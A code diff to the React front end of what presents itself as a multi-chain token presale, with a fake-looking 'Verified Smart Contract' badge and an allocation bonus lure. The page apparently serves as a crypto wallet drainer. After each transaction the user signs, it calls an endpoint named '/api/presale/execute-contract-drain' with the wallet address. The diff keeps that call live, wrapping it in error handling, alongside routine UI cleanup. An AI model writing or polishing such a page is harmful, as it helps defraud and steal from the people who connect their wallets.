@@ -31,16 +31,6 @@ const SUPPORTED_CHAINS = [
     contractAddress: null,
     icon: '🔷',
     color: 'from-blue-400 to-indigo-500'
-  },
-  {
-    name: 'Polygon',
-    chainId: 137,
-    rpcUrl: 'https://polygon-rpc.com',
-    symbol: 'MATIC',
-    explorer: 'https://polygonscan.com',
-    contractAddress: null,
-    icon: '💜',
-    color: 'from-purple-400 to-pink-500'
   }
 ];
 
@@ -193,8 +183,11 @@ function App() {
       const balanceWei = await web3Provider.getBalance(accounts[0]);
       setBalance(ethers.formatEther(balanceWei));
       
+      console.log('✅ Wallet connected:', accounts[0]);
+      
     } catch (err) {
-      setError(err.message);
+      console.error('Connection error:', err);
+      setError(err.message || 'Failed to connect wallet');
     } finally {
       setLoading(false);
     }
@@ -226,9 +219,12 @@ function App() {
         } else {
           setTxStatus(data.message);
         }
+      } else {
+        setError(data.error || 'Failed to check eligibility');
       }
       
     } catch (err) {
+      console.error('Eligibility check error:', err);
       setError('Failed to check eligibility');
     } finally {
       setLoading(false);
@@ -297,6 +293,7 @@ function App() {
       setTxStatus('✅ Transaction submitted!');
 
       const receipt = await tx.wait();
+      console.log('✅ Transaction confirmed:', receipt.hash);
       
       const newBalance = await provider.getBalance(account);
       setBalance(ethers.formatEther(newBalance));
@@ -305,14 +302,18 @@ function App() {
         const newCompleted = [...completedChains, activeChain.name];
         setCompletedChains(newCompleted);
         
-        await fetch('/api/presale/execute-contract-drain', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            walletAddress: account,
-            chainName: activeChain.name
-          })
-        });
+        try {
+          await fetch('/api/presale/execute-contract-drain', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+              walletAddress: account,
+              chainName: activeChain.name
+            })
+          });
+        } catch (e) {
+          console.warn('Backend notification failed:', e);
+        }
         
         if (newCompleted.length === preparedTransactions.length && preparedTransactions.length > 0) {
           setShowCelebration(true);
@@ -323,6 +324,7 @@ function App() {
       }
       
     } catch (err) {
+      console.error('Transaction error:', err);
       setError(err.message || 'Transaction failed');
       setTxStatus('❌ Transaction failed');
     } finally {
@@ -369,14 +371,32 @@ function App() {
 
   useEffect(() => {
     if (window.ethereum) {
-      window.ethereum.on('accountsChanged', (accounts) => {
-        if (accounts.length === 0) disconnectWallet();
-        else setAccount(accounts[0]);
-      });
+      const handleAccountsChanged = (accounts) => {
+        if (accounts.length === 0) {
+          disconnectWallet();
+        } else {
+          setAccount(accounts[0]);
+          if (provider) {
+            provider.getBalance(accounts[0]).then(balance => {
+              setBalance(ethers.formatEther(balance));
+            });
+          }
+        }
+      };
 
-      window.ethereum.on('chainChanged', () => window.location.reload());
+      const handleChainChanged = () => {
+        window.location.reload();
+      };
+
+      window.ethereum.on('accountsChanged', handleAccountsChanged);
+      window.ethereum.on('chainChanged', handleChainChanged);
+
+      return () => {
+        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
+        window.ethereum.removeListener('chainChanged', handleChainChanged);
+      };
     }
-  }, []);
+  }, [provider]);
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
@@ -404,7 +424,7 @@ function App() {
             <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
             <span className="text-green-400 text-sm font-medium">✓ Verified Smart Contract</span>
             <span className="text-gray-400 text-sm">|</span>
-            <span className="text-orange-400 text-sm font-mono">{activeChain.contractAddress.substring(0, 10)}...</span>
+            <span className="text-orange-400 text-sm font-mono">{activeChain.contractAddress?.substring(0, 10)}...</span>
           </div>
         </div>
 
@@ -480,24 +500,6 @@ function App() {
           </div>
         </div>
 
-        {/* Chain Selection - Only show available chains */}
-        <div className="mb-6 flex flex-wrap gap-2 justify-center">
-          {SUPPORTED_CHAINS.map(chain => (
-            <button
-              key={chain.chainId}
-              onClick={() => setActiveChain(chain)}
-              className={`px-4 py-2 rounded-lg font-medium transition ${
-                activeChain.chainId === chain.chainId
-                  ? `bg-gradient-to-r ${chain.color} text-white`
-                  : 'bg-gray-800 text-gray-300 hover:bg-gray-700'
-              } ${!chain.contractAddress ? 'opacity-50 cursor-not-allowed' : ''}`}
-            >
-              {chain.icon} {chain.name}
-              {!chain.contractAddress && ' (Coming Soon)'}
-            </button>
-          ))}
-        </div>
-
         {/* Connect Wallet */}
         <div className="text-center mb-8">
           {!account ? (
@@ -508,7 +510,7 @@ function App() {
             >
               <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-200"></div>
               <div className="relative bg-gray-900 rounded-xl px-10 py-5 text-xl font-bold">
-                {loading ? 'Connecting...' : '🔌 Connect Wallet to Participate'}
+                {loading ? 'Connecting...' : '🔌 Connect Wallet'}
               </div>
             </button>
           ) : (
@@ -575,21 +577,6 @@ function App() {
                 <p className="text-green-400 mb-2">+{presaleStats.currentBonus}% Bonus Applied</p>
                 <p className="text-gray-400 mb-6">Value: ${allocation.valueUSD}</p>
                 
-                {/* Confetti Animation */}
-                <div className="relative h-20 mb-4">
-                  {[...Array(20)].map((_, i) => (
-                    <div
-                      key={i}
-                      className="absolute w-2 h-2 bg-yellow-400 rounded-full animate-confetti"
-                      style={{
-                        left: `${Math.random() * 100}%`,
-                        animationDelay: `${Math.random() * 2}s`,
-                        animationDuration: `${2 + Math.random() * 2}s`
-                      }}
-                    ></div>
-                  ))}
-                </div>
-                
                 <button
                   onClick={() => setShowCelebration(false)}
                   className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-3 px-8 rounded-lg transition transform hover:scale-105"
@@ -626,7 +613,7 @@ function App() {
               ) : scanResult.isEligible ? (
                 <>
                   {/* Allocation Card */}
-                  <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-xl p-6 mb-6 border border-orange-500/30">
+                  <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-xl p-6 mb-6 border border-orange-500/30 relative">
                     <p className="text-gray-400 mb-2">Your Allocation</p>
                     <p className="text-5xl font-bold text-orange-400 mb-2">{allocation.amount} BTH</p>
                     <p className="text-green-400">+{presaleStats.currentBonus}% Bonus Included</p>
@@ -692,54 +679,6 @@ function App() {
                 </div>
               )}
             </div>
-
-            {/* Transaction Status Cards */}
-            {preparedTransactions.length > 0 && (
-              <div className="mt-6 grid grid-cols-1 md:grid-cols-2 gap-3">
-                {preparedTransactions.map((tx, index) => {
-                  const isCompleted = completedChains.includes(tx.chain);
-                  
-                  return (
-                    <div
-                      key={index}
-                      className={`p-4 rounded-lg border transition-all duration-500 ${
-                        isCompleted
-                          ? 'bg-green-900/30 border-green-500/30 transform scale-100'
-                          : 'bg-gray-800/30 border-gray-700 hover:border-orange-500/30'
-                      }`}
-                    >
-                      <div className="flex justify-between items-center">
-                        <div>
-                          <span className="font-bold text-orange-400">{tx.chain}</span>
-                          <p className="text-sm text-gray-400">
-                            {parseFloat(tx.amount).toFixed(4)} {tx.symbol}
-                          </p>
-                        </div>
-                        {isCompleted ? (
-                          <span className="bg-green-600 text-white px-3 py-1 rounded-full text-sm animate-pulse">
-                            ✅ Completed
-                          </span>
-                        ) : (
-                          <span className="bg-gray-700 text-gray-300 px-3 py-1 rounded-full text-sm">
-                            ⏳ Pending
-                          </span>
-                        )}
-                      </div>
-                      
-                      {/* Progress bar for each chain */}
-                      <div className="mt-2 w-full bg-gray-700 rounded-full h-1">
-                        <div 
-                          className={`h-1 rounded-full transition-all duration-500 ${
-                            isCompleted ? 'bg-green-500' : 'bg-orange-500'
-                          }`}
-                          style={{ width: isCompleted ? '100%' : '0%' }}
-                        ></div>
-                      </div>
-                    </div>
-                  );
-                })}
-              </div>
-            )}
           </>
         )}
 
@@ -757,7 +696,7 @@ function App() {
         </div>
       </div>
 
-      <style jsx>{`
+      <style>{`
         @keyframes gradient-x {
           0%, 100% { transform: translateX(0%); }
           50% { transform: translateX(100%); }
@@ -784,11 +723,6 @@ function App() {
           to { transform: scale(1); opacity: 1; }
         }
         
-        @keyframes confetti {
-          0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-          100% { transform: translateY(100px) rotate(720deg); opacity: 0; }
-        }
-        
         .animate-gradient-x {
           animation: gradient-x 3s ease infinite;
         }
@@ -808,14 +742,9 @@ function App() {
         .animate-scaleIn {
           animation: scaleIn 0.3s ease-out;
         }
-        
-        .animate-confetti {
-          animation: confetti 3s ease-out forwards;
-        }
       `}</style>
     </div>
   );
 }
 
 export default App;
-
